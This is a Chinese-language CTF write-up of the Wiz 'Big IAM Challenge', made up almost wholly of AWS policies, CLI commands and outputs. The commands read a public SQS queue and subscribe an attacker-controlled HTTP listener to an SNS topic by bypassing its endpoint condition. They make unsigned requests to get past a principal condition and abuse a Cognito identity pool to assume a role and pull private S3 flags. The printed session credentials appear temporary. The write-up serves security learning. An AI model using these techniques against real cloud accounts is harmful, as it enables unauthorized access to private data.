# WIZ IAM 挑战赛 Writeup

> 原文: https://www.ctfiot.com/124080.html
> ID: 124080


```
{
 "Version": "2012-10-17",
 "Statement": [
 {
 "Effect": "Allow",
 "Principal": "*",
 "Action": "s3:
GetObject",
 "Resource": "arn:
aws:s3:::
thebigiamchallenge-storage-9979f4b/*"
 },
 {
 "Effect": "Allow",
 "Principal": "*",
 "Action": "s3:
ListBucket",
 "Resource": "arn:
aws:s3:::
thebigiamchallenge-storage-9979f4b",
 "Condition": {
 "StringLike": {
 "s3:
prefix": "files/*"
 }
 }
 }
 ]
}
{
 "Version": "2012-10-17",
 "Statement": [
 {
 "Effect": "Allow",
 "Principal": "*",
 "Action": [
 "sqs:
SendMessage",
 "sqs:
ReceiveMessage"
 ],
 "Resource": "arn:
aws:
sqs:us-east-1:
092297851374:
wiz-tbic-analytics-sqs-queue-ca7a1b2"
 }
 ]
}
aws sqs receive-message --queue-url https://queue.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
{
 "Version": "2008-10-17",
 "Id": "Statement1",
 "Statement": [
 {
 "Sid": "Statement1",
 "Effect": "Allow",
 "Principal": {
 "AWS": "*"
 },
 "Action": "SNS:
Subscribe",
 "Resource": "arn:
aws:
sns:us-east-1:
092297851374:
TBICWizPushNotifications",
 "Condition": {
 "StringLike": {
 "sns:
Endpoint": "*@tbic.wiz.io"
 }
 }
 }
 ]
}
> aws sns subscribe help

subscribe
--topic-arn <value>
--protocol <value>
[--notification-endpoint <value>]
nc -lvk 80
aws sns subscribe --protocol http --notification-endpoint http://123.123.123.123:
800/@tbic.wiz.io --topic-arn arn:
aws:
sns:us-east-1:
092297851374:
TBICWizPushNotifications
aws sns confirm-subscription --topic-arn arn:
aws:
sns:us-east-1:
092297851374:
TBICWizPushNotifications --token 336412f37fb687f5d51e6e2425c464de257ebd13d0594......
{
 "Version": "2012-10-17",
 "Statement": [
 {
 "Effect": "Allow",
 "Principal": "*",
 "Action": "s3:
GetObject",
 "Resource": "arn:
aws:s3:::
thebigiamchallenge-admin-storage-abf1321/*"
 },
 {
 "Effect": "Allow",
 "Principal": "*",
 "Action": "s3:
ListBucket",
 "Resource": "arn:
aws:s3:::
thebigiamchallenge-admin-storage-abf1321",
 "Condition": {
 "StringLike": {
 "s3:
prefix": "files/*"
 },
 "ForAllValues:
StringLike": {
 "aws:
PrincipalArn": "arn:
aws:
iam::
133713371337:
user/admin"
 }
 }
 }
 ]
}
> aws s3api list-objects --bucket thebigiamchallenge-admin-storage-abf1321 --prefix 'files/'

An error occurred (AccessDenied) when calling the ListObjects operation: Access Denied
> aws s3api list-objects --bucket thebigiamchallenge-admin-storage-abf1321 --prefix 'files/' --no-sign-request

{
 "Contents": [
 {
 "Key": "files/flag-as-admin.txt",
 "LastModified": "2023-06-07T19:15:43+00:00",
 "ETag": "\"e365cfa7365164c05d7a9c209c4d8514\"",
 "Size": 42,
 "StorageClass": "STANDARD"
 },
 {
 "Key": "files/logo-admin.png",
 "LastModified": "2023-06-08T19:20:01+00:00",
 "ETag": "\"c57e95e6d6c138818bf38daac6216356\"",
 "Size": 81889,
 "StorageClass": "STANDARD"
 }
 ]
}
{
 "Version": "2012-10-17",
 "Statement": [
 {
 "Sid": "VisualEditor0",
 "Effect": "Allow",
 "Action": [
 "mobileanalytics:
PutEvents",
 "cognito-sync:*"
 ],
 "Resource": "*"
 },
 {
 "Sid": "VisualEditor1",
 "Effect": "Allow",
 "Action": [
 "s3:
GetObject",
 "s3:
ListBucket"
 ],
 "Resource": [
 "arn:
aws:s3:::
wiz-privatefiles",
 "arn:
aws:s3:::
wiz-privatefiles/*"
 ]
 }
 ]
}
<!DOCTYPE html>
<html>
<head>
 <title>Cognito JavaScript SDK Example</title>
 <script src="https://sdk.amazonaws.com/js/aws-sdk-2.100.0.min.js"></script>
</head>

 <script>
 // 初始化AWS SDK配置
 AWS.config.region = 'us-east-1';
 AWS.config.credentials = new AWS.CognitoIdentityCredentials({
 IdentityPoolId: 'us-east-1:
b73cb2d2-0d00-4e77-8e80-f99d9c13da3b',
 });
 // 获取临时凭证
 AWS.config.credentials.get(function(err) {
 if (!err) {
 // 凭证获取成功
 var accessKeyId = AWS.config.credentials.accessKeyId;
 var secretAccessKey = AWS.config.credentials.secretAccessKey;
 var sessionToken = AWS.config.credentials.sessionToken;

 // 进行后续操作，如访问S3
 accessS3(accessKeyId, secretAccessKey, sessionToken);
 } else {
 // 凭证获取失败
 console.error('Error retrieving credentials: ' + err);
 }
 });
 // 使用临时凭证访问S3
 function accessS3(accessKeyId, secretAccessKey, sessionToken) {
 var s3 = new AWS.S3({
 accessKeyId: accessKeyId,
 secretAccessKey: secretAccessKey,
 sessionToken: sessionToken,
 });
 var params = {
 Bucket: 'wiz-privatefiles',
 };
 s3.getSignedUrl('listObjectsV2', params, function(err, data) {
 if (!err) {
 // S3存储桶列表获取成功
 console.log(data);
 } else {
 // S3存储桶列表获取失败
 console.error('Error listing S3 buckets: ' + err);
 }
 });
 }
 </script>

</html>
<!DOCTYPE html>
<html>
<head>
 <title>Cognito JavaScript SDK Example</title>
 <script src="https://sdk.amazonaws.com/js/aws-sdk-2.100.0.min.js"></script>
</head>

 <script>
 // 初始化AWS SDK配置
 AWS.config.region = 'us-east-1';
 AWS.config.credentials = new AWS.CognitoIdentityCredentials({
 IdentityPoolId: 'us-east-1:
b73cb2d2-0d00-4e77-8e80-f99d9c13da3b',
 });
 // 获取临时凭证
 AWS.config.credentials.get(function(err) {
 if (!err) {
 // 凭证获取成功
 var accessKeyId = AWS.config.credentials.accessKeyId;
 var secretAccessKey = AWS.config.credentials.secretAccessKey;
 var sessionToken = AWS.config.credentials.sessionToken;

 // 进行后续操作，如访问S3
 accessS3(accessKeyId, secretAccessKey, sessionToken);
 } else {
 // 凭证获取失败
 console.error('Error retrieving credentials: ' + err);
 }
 });
 // 使用临时凭证访问S3
 function accessS3(accessKeyId, secretAccessKey, sessionToken) {
 var s3 = new AWS.S3({
 accessKeyId: accessKeyId,
 secretAccessKey: secretAccessKey,
 sessionToken: sessionToken,
 });
 var params = {
 Bucket: 'wiz-privatefiles',
 Key: 'flag1.txt',
 };
 s3.getSignedUrl('getObject', params, function(err, data) {
 if (!err) {
 // S3存储桶对象获取成功
 console.log(data);
 } else {
 // S3存储桶对象获取失败
 console.error('Error get S3 bucket object: ' + err);
 }
 });
 }
 </script>

</html>
{
 "Version": "2012-10-17",
 "Statement": [
 {
 "Effect": "Allow",
 "Principal": {
 "Federated": "cognito-identity.amazonaws.com"
 },
 "Action": "sts:
AssumeRoleWithWebIdentity",
 "Condition": {
 "StringEquals": {
 "cognito-identity.amazonaws.com:
aud": "us-east-1:
b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
 }
 }
 }
 ]
}
> aws sts assume-role-with-web-identity help

--role-arn <value>
--role-session-name <value>
--web-identity-token <value>
> aws cognito-identity get-id --identity-pool-id us-east-1:
b73cb2d2-0d00-4e77-8e80-f99d9c13da3b

{
 "IdentityId": "us-east-1:
453cea83-a2c0-4b64-a7ff-9dc3783701db"
}
> aws cognito-identity get-open-id-token --identity-id us-east-1:
453cea83-a2c0-4b64-a7ff-9dc3783701db

{
 "IdentityId": "us-east-1:
453cea83-a2c0-4b64-a7ff-9dc3783701db",
 "Token": "eyJraWQiOiJ1cy1lYXN0Lxxxx..."
}
> aws sts assume-role-with-web-identity --role-arn arn:
aws:
iam::
092297851374:
role/Cognito_s3accessAuth_Role --role-session-name teamssix --web-identity-token eyJraWQiOiJ1cy1lYXN0LTEzIiwidHlwIjoi...

{
 "Credentials": {
 "AccessKeyId": "ASIARK7LBOHXDFQ6KRE3",
 "SecretAccessKey": "Wqk43MfgwPM5F7Z9IfFgv24RwHuCVDh8M0swTUyj",
 "SessionToken": "IQoJb3JpZ2luX2VjEND...",
 "Expiration": "2023-07-06T16:36:18+00:00"
 },
 "SubjectFromWebIdentityToken": "us-east-1:
453cea83-a2c0-4b64-a7ff-9dc3783701db",
 "AssumedRoleUser": {
 "AssumedRoleId": "AROARK7LBOHXASFTNOIZG:
teamssix",
 "Arn": "arn:
aws:
sts::
092297851374:
assumed-role/Cognito_s3accessAuth_Role/teamssix"
 },
 "Provider": "cognito-identity.amazonaws.com",
 "Audience": "us-east-1:
b73cb2d2-0d00-4e77-8e80-f99d9c13da3b"
}
> export AWS_ACCESS_KEY_ID=ASIARK7LBOHXDFQ6KRE3
> export AWS_SECRET_ACCESS_KEY=Wqk43MfgwPM5F7Z9IfFgv24RwHuCVDh8M0swTUyj
> export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEND...
> aws s3 ls

2023-06-05 01:07:29 tbic-wiz-analytics-bucket-b44867f
2023-06-05 21:07:44 thebigiamchallenge-admin-storage-abf1321
2023-06-05 00:31:02 thebigiamchallenge-storage-9979f4b
2023-06-05 21:28:31 wiz-privatefiles
2023-06-05 21:28:31 wiz-privatefiles-x1000
aws s3api get-object --bucket wiz-privatefiles-x1000 --key flag2.txt flag2.txt
```
